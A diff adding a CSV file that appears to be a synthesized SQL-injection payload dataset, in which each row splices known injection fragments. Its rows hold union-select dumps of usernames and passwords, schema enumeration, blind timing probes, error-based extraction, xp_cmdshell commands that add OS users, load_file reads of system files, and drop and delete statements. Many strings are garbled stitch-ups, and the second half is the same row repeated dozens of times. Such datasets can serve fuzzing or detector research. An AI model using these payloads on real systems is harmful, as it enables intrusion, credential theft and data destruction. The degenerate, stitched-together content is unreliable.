@@ -1,0 +1,174 @@
+synthesized_code,origin_code1,origin_code2
+" ;insert into users(id,username,password) values('100','new','new');union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ;--", drop table sc3； delete table dirs  drop table sc3；,"'' or (select Count(*) from table)>0 updatexml(1,concat(0x7e,(select @@version),0x7e),1) "
+" ) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exists (select * from sysobjects)","') orexec master.dbo.xp_cmdshell 'net user username password /add' union select 1,2","‘create table dirs(paths varchar(100), id int) 1=(if((user() regexp '^r'),1,0))"
+ drop table sc3；(select IS_SRVROLEMEMBER('sysadmin')) create table test like users;," and 1=1;extractvalue(1, concat(0x7e,@@version,0x7e)) ;insert into users(id,username,password) values('100','new','new');"," create table test like users;exec master.dbo.sp_password null,username,password and 1=1;"
+(select IS_MEMBER('db_owner')) (select count(*) from sysobjects) exists (select * from sysobjects)," ;insert into users(id,username,password) values('100','new','new');(select user_name());--","'' or (select @@version） updatexml(1,concat(0x7e,(select @@version),0x7e),1) "
+ drop table sc3； delete table dirs  drop table sc3；, create table test like users;exec master.dbo.xp_cmdshell 'net user username password /add' ;delete from user_data;, drop table sc3； INSERT INTO drop table sc3；
+ drop table sc3； exec master..xp_cmdshell ' drop table sc3；, drop table sc3； select version() drop table sc3；," and 1=1;create table dirs(paths varchar(100), id int) ;delete from user_data;"
+ create table test like users;exec master.dbo.sp_addlogin username and 1=1;, create table test like users;exec master.dbo.sp_addlogin username and 1=1;,">0 -- order by 1create table dirs(paths varchar(100), id int)"
+ ;drop table test;1 ) --," select * from users where id=1  if(length(database())=8,sleep(5),1) exists (select * from sysobjects)",>=0 --11
+" = 1 union select 1,2,3  /*1 = 1 --","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,@@datadir,3(select count(*) from mysql.user)>0", = 1 -- order by 11
+ drop table sc3； WAITFOR DELAY '0:0:5' drop table sc3；,"--+extractvalue(1, concat(0x7e,@@version,0x7e)) ;drop table test;", drop table sc3； (select Count(*) from table)>0 drop table sc3；
+" = 1 union select 1,2,3  /*extractvalue(1, concat(0x7e,@@version,0x7e)) = 1 --"," ;delete from user_data; union select 1,2,load_file('C://1.txt') ) --","(select IS_SRVROLEMEMBER('sysadmin'))union select 1,@@datadir,3 select * from users where id=1 "
+"' and union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2","'' or union select 1,username,password from users where id=2 1=(if((user() regexp '^r'),1,0))"," = 2 -- union select 1,2,load_file('C://1.txt') if(length(database())=8,sleep(5),1)"
+ create table test like users;(select IS_MEMBER('db_owner')) and 1=1;, ;drop table test; 1 = 2 union all select user()  (select count(*) from sysobjects)," and 1=1;exec master.dbo.xp_cmdshell 'net user username password /add' = 1 union select 1,2,3  /*"
+" ;delete from user_data;union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 #"," (select Count(*) from table)>0ord(mid(user(),1,1))=114 or'1'='1"," ;delete from user_data; union select 1,2,load_file('C://1.txt') ) --"
+ drop table sc3； (select @@version） drop table sc3；, drop table sc3； INSERT INTO drop table sc3；,"--+extractvalue(1, concat(0x7e,@@version,0x7e)) ;drop table test;"
+" drop table sc3； union select 1,2,(database())  drop table sc3；","--+extractvalue(1, concat(0x7e,@@version,0x7e)) ;drop table test;", drop table sc3； select * from users where id=1 drop table sc3；
+>=0 -- sleep(5) sleep(5)," ;insert into users(id,username,password) values('100','new','new'); 1 = 2 union all select user()  1=(select name from master.dbo.sysdatabases where id=1)", ) or  sleep(5) or'1'='1
+" union select 1,1,1,load_file(c:\\boot.ini) 
+union select 1,@@datadir,3 ' and 1=2","(select IS_SRVROLEMEMBER('sysadmin'))union select 1,@@datadir,3 select * from users where id=1 ","'' or(select IS_SRVROLEMEMBER('sysadmin')) union select 1,username,password from users where id=2"
+" ;select 1,2,3; union select 1,2,load_file('C://1.txt') 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=","--+extractvalue(1, concat(0x7e,@@version,0x7e)) ;select 1,2,3;",") and union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  exists (select * from sysobjects)"
+ drop table sc3； (select Count(*) from table)>0 drop table sc3；, and 1=1;exec master.dbo.xp_cmdshell 'net user username password /add' ;delete from user_data;, create table test like users;exec master.dbo.sp_addlogin username and 1=1;
+" ;insert into users(id,username,password) values('100','new','new');1';--"," create table test like users;exec master.dbo.sp_password null,username,password = 1 union select 1,2,3  /*"," + union select 1,2,load_file('C://1.txt') select * from users where id=1 "
+" drop table sc3； benchmark(3000000,MD5(1)) drop table sc3；", drop table sc3； INSERT INTO drop table sc3；, drop table sc3； INSERT INTO drop table sc3；
+ drop table sc3； select * from users where id=1 drop table sc3；," drop table sc3； union select 1,2,(database())  drop table sc3；"," drop table sc3； union select 1,1,1,load_file(c:\\boot.ini) 
+ drop table sc3；"
+ ;drop table test; 1 = 2 union all select user()  (select count(*) from admin where len(*)>0), create table test like users;exec master.dbo.sp_addlogin username and 1=1;,‘1 select * from users where id=1 
+ create table test like users;exec master.dbo.sp_addlogin username--+,"‘create table dirs(paths varchar(100), id int) union select 1,username,password from users where id=2", drop table sc3； INSERT INTO drop table sc3；
+" ;delete from user_data;extractvalue(1, concat(0x7e,@@version,0x7e))>0 --",">0 -- if(length(database())=8,sleep(5),1)1","exec master.dbo.sp_password null,username,passwordunion select 1,@@datadir,3 union select 1,2"
+ drop table sc3； WAITFOR DELAY '0:0:5' drop table sc3；, drop table sc3；(select IS_MEMBER('db_owner')) and 1=1;, create table test like users;exec master.dbo.sp_addlogin username and 1=1;
+ drop table sc3； (select Count(*) from table)>0 drop table sc3；," updatexml(1,concat(0x7e,(select @@version),0x7e),1) union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) exists (select * from sysobjects)"," drop table sc3； union select 1,2,(database())  drop table sc3；"
+ (select Count(*) from table)>0 (select count(*) from admin where len(*)>0) or'1'='1,"exec master.dbo.sp_password null,username,password (select count(*) from admin where len(*)>0) exists (select * from sysobjects)","'')) orextractvalue(1, concat(0x7e,@@version,0x7e)) union select 1,username,password from users where id=2"
+ drop table sc3；(select IS_SRVROLEMEMBER('sysadmin')) create table test like users;,"create table dirs(paths varchar(100), id int) (select count(*) from admin where len(*)>0) select * from users where id=1 ", drop table sc3； (select @@version） drop table sc3；
+ create table test like users;(select IS_MEMBER('db_owner')) and 1=1;,"union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,@@datadir,3 benchmark(3000000,MD5(1))", drop table sc3；(select IS_SRVROLEMEMBER('sysadmin')) create table test like users;
+" = 1 union select 1,2,3  /*extractvalue(1, concat(0x7e,@@version,0x7e)) = 1 --"," = 2 --union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"," 1=(select name from master.dbo.sysdatabases where id=1)union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) exec master..xp_cmdshell '"
+" ;insert into users(id,username,password) values('100','new','new');1 */", ;drop table test; 1 = 2 union all select user()  (select count(*) from admin where len(*)>0)," 1 = 2 union all select user()  (select count(*) from sysobjects) union select 1,username,password from users where id=2"
+" or  if(length(database())=8,sleep(5),1) &&", 1)) or  1 = 2 union all select user()  exists (select * from sysobjects),"‘exec master.dbo.xp_cmdshell 'net user username password /add' 1=(if((user() regexp '^r'),1,0))"
+" and 1=1;exec master.dbo.sp_password null,username,password ;delete from user_data;", drop table sc3；(select IS_SRVROLEMEMBER('sysadmin')) create table test like users;," ' and 1=2union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or'1'='1"
+ drop table sc3； delete table dirs  drop table sc3；,"'' or WAITFOR DELAY '0:0:5' union select 1,username,password from users where id=2", drop table sc3； select * from users where id=1  drop table sc3；
+" 1 or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exists (select * from sysobjects)","'' orexec master.dbo.sp_addlogin username union select 1,2"," 1 or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exists (select * from sysobjects)"
+" order by 1 (select count(*) from admin where len(*)>0) union select 1,1,1,load_file(c:\\boot.ini) 
+","'')) or1 union select 1,2"," 1=(select name from master.dbo.sysdatabases where id=1)union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) exec master..xp_cmdshell '"
+ and 1=1;exec master.dbo.xp_cmdshell 'net user username password /add' ;delete from user_data;,"#union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),31","--+extractvalue(1, concat(0x7e,@@version,0x7e))>=0 --"
+ drop table sc3；(select IS_SRVROLEMEMBER('sysadmin')) create table test like users;, drop table sc3； INSERT INTO drop table sc3；," ' and 1=2union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or'1'='1"
+" = 1 union select 1,2,3  /*extractvalue(1, concat(0x7e,@@version,0x7e))>=0 --", drop table sc3；(select IS_SRVROLEMEMBER('sysadmin')) drop table sc3；,"'')) orcreate table dirs(paths varchar(100), id int) union select 1,2"
+ drop table sc3；(select IS_SRVROLEMEMBER('sysadmin')) create table test like users;," ;drop table test; sleep(5)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3", drop table sc3； (select @@version） drop table sc3；
+ drop table sc3； (select @@version） drop table sc3；," ;drop table test; sleep(5)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"," drop table sc3； union select 1,2,(database())  drop table sc3；"
+" ;select 1,2,3;(select user_name());--"," ' and 1=2 1 = 2 union all select user()  union select 1,username,password from users where id=2"," ;select 1,2,3;(select user_name())--"
+"and 0 ><(select user_name()) union select 1,2","exec master.dbo.xp_cmdshell 'net user username password /add'union select 1,@@datadir,3 union select 1,username,password from users where id=2","'' or benchmark(3000000,MD5(1)) 1=(if((user() regexp '^r'),1,0))"
+ create table test like users;(select IS_MEMBER('db_owner')) and 1=1;," ;select 1,2,3;union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 --"," = 1 union select 1,2,3  /*1 = 2 --"
+ drop table sc3； INSERT INTO drop table sc3；, drop table sc3； or'1'='1 drop table sc3；,"'' or benchmark(3000000,MD5(1)) 1=(if((user() regexp '^r'),1,0))"
+" ;insert into users(id,username,password) values('100','new','new');1#"," exec master..xp_cmdshell 'union select 1,@@datadir,3 &&"," ;select 1,2,3;(select user_name())--"
+" = 1 union select 1,2,3  /*create table dirs(paths varchar(100), id int)>=0 --"," ;drop table test; union select 1,2,load_file('C://1.txt')ord(mid(user(),1,1))=114","ord(mid(user(),1,1))=114 order by 1 exec master..xp_cmdshell '"
+" or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 &&","'' or INSERT INTO union select 1,username,password from users where id=2"," ;drop table test; sleep(5)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
+'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；,'' or drop table sc3； drop table sc3；
